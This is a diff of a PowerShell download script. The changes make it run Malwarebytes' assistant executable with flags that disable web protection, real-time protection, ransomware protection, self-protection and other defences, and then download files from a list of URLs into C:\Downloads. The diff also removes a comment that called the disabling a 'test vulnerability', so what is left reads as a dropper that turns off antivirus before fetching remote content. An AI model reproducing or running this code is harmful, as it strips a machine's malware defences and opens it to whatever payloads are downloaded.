@@ -145,20 +145,6 @@ $outputFolder = "C:\Downloads"
 foreach ($url in $urls) {
     $fileName = [System.IO.Path]::GetFileName($url)
     $outputPath = Join-Path -Path $outputFolder -ChildPath $fileName
-
-    Write-Host "Downloading file from $url..."
-    
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $outputPath
-        Write-Host "File downloaded successfully: $outputPath"
-    } catch {
-        Write-Host "Failed to download file: $url"
-    }
-
-    try {
-
-    # Test vulnerability allowing malwarebytes anti-malware (MBAM) to be disabled automatically
-    
     Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablewebprotection", "."
     Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablertp", "."
     Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablerw", "."
@@ -167,8 +153,13 @@ foreach ($url in $urls) {
     Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disableautodbcls", "."
     Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablesp", "."
 
+    Write-Host "Downloading file from $url..."
+    
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $outputPath
+        Write-Host "File downloaded successfully: $outputPath"
     } catch {
-        
+        Write-Host "Failed to download file: $url"
     }
     
 }
